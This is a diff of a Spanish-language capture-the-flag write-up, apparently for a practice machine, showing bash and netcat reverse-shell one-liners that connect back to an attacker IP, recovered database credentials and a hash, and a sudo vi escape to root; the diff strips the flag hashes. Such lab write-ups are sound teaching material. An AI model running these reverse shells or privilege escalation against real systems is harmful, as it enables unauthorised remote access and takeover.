@@ -179,19 +179,15 @@ sh -i >& /dev/tcp/10.10.15.157/8001 0>&1
 bash -c 'bash -i >& /dev/tcp/10.10.15.157/8001 0>&1'
 ```
 
-#### con esta bash notamos que perdemos coneccion. asi que usaremos una enviada por netcat para intentar resolver esto.
+###### con esta bash notamos que perdemos coneccion. asi que usaremos una enviada por netcat para intentar resolver esto.
 
 ```python
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f
 ```
 
 ### despues de esto hacemos tratamiento tty y empezamos a examinar la maquina.
-user.txt
-```python
-ec9b13ca4d6229cd5cc1e09980965bf7
-```
 
-#### vamos a navegar hasta el directorio donde esta alojada la base de datos
+###### vamos a navegar hasta el directorio donde esta alojada la base de datos
 passid:
 ```python
 2cb42f8734ea607eefed3b70af13bbd3
@@ -202,7 +198,7 @@ user: postgres
 password: P@s5w0rd!
 ```
 
-#### con estas credenciales podriamos intentar entrar via ssh
+### con estas credenciales podriamos intentar entrar via ssh
 
 hacemos sudo -l para saber cuales son los permiso que tiene el usuario postgres como administrador 
 
@@ -218,8 +214,4 @@ sudo /bin/vi /etc/postgresql/11/main/pg_hba.config
 abrimos el archivo, y le decimos que nos de una shell y presionamos enter. 
 automaticamente seremos root
 
-root.txt
-```css
-dd6e058e814260bc70e9bbdef2715849
-```
-
+### WE ARE ROOT
